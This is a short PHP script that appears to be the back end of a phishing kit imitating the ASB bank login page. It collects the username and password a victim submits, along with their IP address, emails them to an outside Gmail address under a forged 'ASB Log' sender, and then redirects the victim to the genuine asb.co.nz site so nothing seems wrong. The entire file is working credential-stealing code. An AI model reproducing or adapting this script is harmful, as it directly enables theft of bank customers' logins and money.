<?
$ip = getenv("REMOTE_ADDR");
$msg .= "\n"; 
$msg .= "User Name: ".$_POST['username']."\n";
$msg .= "Password: ".$_POST['pass']."\n";
$msg .= "\n"; 
$msg .= "IP: ".$ip."\n";
$msg .= "------------Built By MMM----------------\n";
$post = "mikerogers224@gmail.com";
$subj = "$ip - ".$_POST['username']."\n";
$from = "From: ASB Log<logs@support.my>";
mail("$post",$subj, $msg, $from); 
header("Location: https://www.asb.co.nz/");	  

?>